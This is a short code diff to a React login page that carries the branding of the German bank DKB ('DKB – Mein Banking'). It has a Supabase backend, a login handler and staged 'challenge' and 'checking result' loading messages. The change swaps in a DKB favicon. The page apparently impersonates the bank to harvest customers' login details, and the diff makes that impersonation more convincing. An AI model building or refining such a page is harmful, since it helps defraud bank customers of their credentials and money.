@@ -3,6 +3,7 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
+import faviconAsset from "@/assets/favicons/dkb.png.asset.json";
 import logoAsset from "@/assets/dkb-logo.svg.asset.json";
 
 const BG = "#F3F9FE";
@@ -60,7 +61,7 @@ const DKB = () => {
     "Herausforderung laden…",
     "Das Ergebnis wird überprüft…",
   ];
-  usePageMeta("DKB – Mein Banking", logoAsset.url);
+  usePageMeta("DKB – Mein Banking", faviconAsset.url);
 
   const doLogin = async () => {
     if (submitting) return;
